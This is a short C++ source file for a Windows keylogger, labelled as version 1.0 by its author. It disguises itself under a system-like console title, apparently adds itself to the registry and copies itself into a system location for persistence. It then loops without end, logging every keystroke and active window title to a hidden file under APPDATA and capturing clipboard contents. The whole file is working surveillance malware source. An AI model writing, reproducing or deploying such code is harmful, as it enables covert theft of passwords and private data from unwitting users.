//KeyLogger.cpp v1.0 made by Fibek
#include <iostream>
#include "KeyLogger.h"
#include <fstream>
#include <Windows.h>
#include "CClip.h"
#include <ctime>
#include <string>

int main(int argc, char * argv[])
{
	std::fstream logFile, clipFile;
	KeyLogger k;
	CClip cp;
	time_t sysbasetime = time(0);
	char * date = ctime(&sysbasetime);
	std::string handle = k.GetWindowTitle();
	CreateMutex(NULL, TRUE, "8154d1e24f699f5b217f5ebc8c8c823c");
	if (GetLastError() != ERROR_ALREADY_EXISTS) {
		SetConsoleTitle("msvsysapp.exe");
		/*FreeConsole();*/
		Sleep(500);
		k.AddREG();
		k.CopyToSys(argv[0]);
		std::cout << "[  i  ] Starting KeyLogger...	[  i  ]";
		logFile.open((getenv("APPDATA") + std::string("\\logs.dat")), fstream::app);
		logFile << "\n \n   " << date << '\n'
			<< "APP: " << handle << '\n';
		logFile.close();
		while (true) {
			if (handle != k.GetWindowTitle()) {
				logFile.open((getenv("APPDATA") + std::string("\\logs.dat")), fstream::app);
				Sleep(300);
				logFile << "\n \nAPP: " << k.GetWindowTitle() << '\n';
				handle = k.GetWindowTitle();
				logFile.close();
			}
			k.OEMkeys(logFile);
			k.AZkeys(logFile);
			k.NUMkeys(logFile);
			k.SpecialKeys(logFile);
			cp.GetClipboard(clipFile);
		}
	}
	system("pause");
	return 0;
}